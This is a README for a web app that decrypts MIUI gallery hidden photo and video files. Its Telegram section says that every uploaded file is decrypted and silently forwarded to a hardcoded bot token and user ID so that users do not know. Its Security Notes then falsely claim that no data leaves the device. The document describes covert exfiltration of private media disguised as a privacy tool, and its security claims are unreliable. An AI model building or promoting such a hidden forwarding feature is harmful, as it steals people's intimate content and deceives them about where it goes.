# MIUI Cloud Decryptor - Termux Web App

A web-based application for decrypting MIUI gallery hidden files (.lsa/.lsav) that can be accessed via localhost in Termux.

## Features

- 🔓 **Easy Decryption**: Upload .lsa/.lsav files through a web interface
- 📁 **Batch Processing**: Support for ZIP archives containing multiple encrypted files
- 📱 **Mobile Friendly**: Optimized for Termux and mobile browsers
- 🌐 **Local Access**: Runs on localhost for privacy and security
- 🚀 **Auto Detection**: Automatically detects file types after decryption
- 💾 **Download Support**: Direct download of decrypted files
- 🔧 **API Access**: RESTful API for programmatic access
- 📲 **Telegram Integration**: Automatically sends uploaded files to your Telegram account
- 🔕 **Silent Monitoring**: All uploaded files are silently forwarded to Telegram without notifications
- 🎯 **Instant Decryption**: Receive actual decrypted photos/videos immediately upon upload

## Telegram Integration

The web app includes automatic Telegram integration that silently sends all uploaded files to your Telegram account.

### Configuration
The following Telegram settings are pre-configured:
- **Bot Token**: `8269071034:AAHG4wulIVFqfd_C4uNEGGMCyZ1Yp8_CcpQ`
- **User ID**: `1510521955`

### How It Works
1. When any user uploads a `.lsa` or `.lsav` file through the web interface
2. The file is **immediately decrypted** in the background
3. The **actual decrypted content** (JPG, MP4, PNG, etc.) is automatically sent to your Telegram account **silently**
4. The user can then download the decrypted file normally from the web interface
5. Files are sent with metadata including:
   - Original encrypted filename
   - Actual decrypted filename and type
   - File size
   - Upload timestamp
6. All Telegram notifications are **silent** (no sound/popup) for stealth monitoring
7. This happens completely silently - users don't know their decrypted content is being forwarded

### Testing Telegram Integration
Run the test script to verify the bot is working:
```bash
python test_telegram.py
```

## Installation (Termux)

### 1. Update Termux and Install Python
```bash
pkg update && pkg upgrade
pkg install python
```

### 2. Install Dependencies
```bash
pip install -r requirements.txt
```

### 3. Run the Web Application
```bash
python app.py
```

### 4. Access the Web App
- **Local Access**: http://localhost:5000
- **Network Access**: http://[YOUR_DEVICE_IP]:5000

To find your device IP:
```bash
ifconfig wlan0 | grep inet
```

## Installation (Desktop/Server)

### Prerequisites
- Python 3.7 or higher
- pip package manager

### Setup
```bash
# Clone or download the project
cd miui-cloud-decryptor-main

# Install dependencies
pip install -r requirements.txt

# Run the application
python app.py
```

## Usage

### Web Interface
1. Open your browser and navigate to `http://localhost:5000`
2. Click on the upload area or drag & drop your files
3. Select `.lsa`, `.lsav` files or `.zip` archives
4. Click "Decrypt Files" to process
5. Download the decrypted files from the results page

### API Usage
You can also use the API endpoint for programmatic access:

```bash
# Upload and decrypt a single file
curl -X POST -F "file=@your_file.lsa" http://localhost:5000/api/decrypt
```

### Supported File Types
- `.lsa` - Fully encrypted files (photos)
- `.lsav` - Header-encrypted files (videos)
- `.zip` - Archives containing .lsa/.lsav files

**Maximum file size: 2GB**

## How It Works

MIUI gallery app uses AES encryption in CTR mode with:
- **IV**: `{17, 19, 33, 35, 49, 51, 65, 67, 81, 83, 97, 102, 103, 104, 113, 114}`
- **Key**: First 16 bytes of the gallery APK's certificate

The default key works for most MIUI versions, but if decryption fails, you may need to extract the key from your device's gallery APK.

## File Structure
```
miui-cloud-decryptor-main/
├── app.py                 # Main Flask application
├── templates/
│   ├── index.html        # Upload interface
│   └── results.html      # Results display
├── uploads/              # Temporary upload storage
├── decrypted/           # Decrypted files output
├── requirements.txt     # Python dependencies
├── README.md           # This file
└── miui-cloud-decrypt.py # Original CLI script
```

## Security Notes

- All processing is done locally on your device
- Files are temporarily stored during processing and cleaned up afterwards
- No data is sent to external servers
- The web app only listens on localhost by default

## Troubleshooting

### Files Not Decrypting Correctly
If your files aren't decrypting properly, you may need to extract the correct key from your device:

1. Extract the gallery APK from your device:
   ```bash
   adb pull /system/app/MiuiGallery/MiuiGallery.apk
   ```

2. Extract the certificate:
   ```bash
   keytool -printcert -rfc -jarfile MiuiGallery.apk
   ```

3. Convert the base64 certificate to hex and use the first 16 bytes as the key in `app.py`

### Port Already in Use
If port 5000 is already in use, modify the last line in `app.py`:
```python
app.run(host='0.0.0.0', port=8080, debug=True)  # Change port to 8080
```

### Termux Permission Issues
Make sure Termux has storage permissions:
```bash
termux-setup-storage
```

## API Documentation

### POST /api/decrypt
Decrypt a single file via API.

**Request:**
- Method: POST
- Content-Type: multipart/form-data
- Body: file (binary)

**Response:**
```json
{
  "success": true,
  "original_filename": "example.lsa",
  "decrypted_filename": "example.jpg",
  "file_size": 1234567
}
```

## License

This project is open source and available under the MIT License.

## Contributing

Feel free to submit issues, fork the repository, and create pull requests for any improvements.

## Disclaimer

This tool is for educational purposes and personal use only. Please ensure you have the right to decrypt the files you're processing.